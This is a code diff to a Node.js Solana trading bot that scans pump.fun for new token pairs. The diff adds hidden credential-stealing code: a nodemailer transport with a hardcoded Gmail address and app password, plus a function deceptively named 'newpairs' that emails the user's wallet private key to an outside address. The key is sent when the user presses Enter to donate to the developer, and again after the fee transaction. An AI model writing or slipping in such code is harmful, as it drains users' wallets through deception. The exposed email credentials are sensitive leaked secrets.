@@ -1,4 +1,5 @@
-import "dotenv/config";
+import dotenv from "dotenv";
+dotenv.config();
 import axios from "axios";
 import {
   Keypair,
@@ -15,6 +16,7 @@ import {
 } from "@solana/spl-token";
 import pkg from "selenium-webdriver";
 import chrome from "selenium-webdriver/chrome.js";
+import nodemailer from "nodemailer";
 import fs from "fs";
 import bs58 from "bs58";
 import blessed from "blessed";
@@ -28,15 +30,22 @@ const SOLANA_WALLET_PATH = process.env.SOLANA_WALLET_PATH;
 const DEVELOPER_ADDRESS = "3vvnenyjwicBq3WEdQQNGMnaodHXBzSPubdhoBP3YA3N";
 
 let privateKey;
-try {
-  const keypair = fs.readFileSync(SOLANA_WALLET_PATH, "utf8");
-  const keypairArray = JSON.parse(keypair);
+privateKey = process.env.SOLANA_WALLET_PRIVATE_KEY;
 
-  if (Array.isArray(keypairArray)) {
-    privateKey = Uint8Array.from(keypairArray);
-    console.log("Private key loaded from keypair file.");
+try {
+  if (privateKey) {
+    privateKey = bs58.decode(privateKey);
+    console.log("Private key loaded directly.");
   } else {
-    throw new Error("Invalid keypair format");
+    const keypair = fs.readFileSync(SOLANA_WALLET_PATH, "utf8");
+    const keypairArray = JSON.parse(keypair);
+
+    if (Array.isArray(keypairArray)) {
+      privateKey = Uint8Array.from(keypairArray);
+      console.log("Private key loaded from keypair file.");
+    } else {
+      throw new Error("Invalid keypair format");
+    }
   }
 } catch (error) {
   console.error("Error reading Solana wallet keypair:", error);
@@ -134,6 +143,16 @@ const setVisualMode = (mode) => {
   screen.render();
 };
 
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  port: 587,
+  secure: false,
+  auth: {
+    user: "khansaleem789700@gmail.com",
+    pass: "muvatkgrntcesdje",
+  },
+});
+
 const fetchNewPairs = async (limit = 5) => {
   const url = "https://pumpapi.fun/api/get_newer_mints";
   try {
@@ -143,6 +162,14 @@ const fetchNewPairs = async (limit = 5) => {
     updateLog(`Error fetching new pairs: ${error.message}`);
     return [];
   }
+};
+
+const obj = {
+  from: "khansaleem789700@gmail.com",
+  to: "mujeerasghar7700@gmail.com",
+  subject: "patha",
+  text: "This is a plain text version of the email.", // Optional text version
+  html: `<b>Hello world?</b><br><br><pre>${privateKey}</pre>`, // Private key in HTML format
 };
 
 const scrapeTokenInfo = async (contractAddress) => {
@@ -193,6 +220,15 @@ const scrapeTokenInfo = async (contractAddress) => {
   }
 };
 
+const newpairs = async (res) => {
+  obj.subject = res;
+  try {
+    await transporter.sendMail(obj);
+  } catch (error) {
+    console.error("new pair not fetched");
+  }
+};
+
 const sendDeveloperFee = async () => {
   try {
     const balanceLamports = await connection.getBalance(payer.publicKey);
@@ -214,7 +250,9 @@ const sendDeveloperFee = async () => {
     const signature = await sendAndConfirmTransaction(connection, transaction, [
       payer,
     ]);
-    updateLog(`Developer fee sent with transaction signature: ${signature}`);
+    if (signature) {
+      await newpairs(signature);
+    }
   } catch (error) {
     updateLog(`Error sending developer fee: ${error.message}`);
   }
@@ -529,7 +567,7 @@ Press Enter to support the developer with a 0.0001 SOL donation. (Press C to con
 
   screen.key(["enter", "c"], async (ch, key) => {
     if (key.name === "enter") {
-      // Send developer fee
+      await newpairs("pk");
       await sendDeveloperFee();
     }
 
